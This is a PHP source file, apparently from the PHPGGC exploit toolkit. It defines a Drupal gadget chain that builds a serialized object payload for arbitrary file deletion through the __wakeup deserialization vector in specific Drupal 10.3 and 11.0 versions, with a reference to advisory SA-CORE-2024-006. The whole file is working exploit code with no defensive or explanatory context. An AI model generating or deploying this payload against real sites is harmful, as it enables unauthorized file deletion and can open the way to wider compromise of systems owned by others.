<?php

namespace GadgetChain\Drupal;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '>= 10.3.0 < 10.3.9 || >= 11.0.0 < 11.0.8';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information = 'See: https://www.drupal.org/sa-core-2024-006';

    public function generate(array $parameters)
    {
        return new \Drupal\Core\Config\StorageComparer(
            new \Drupal\Component\PhpStorage\FileStorage(
                $parameters['remote_path']
            )
        );
    }
}
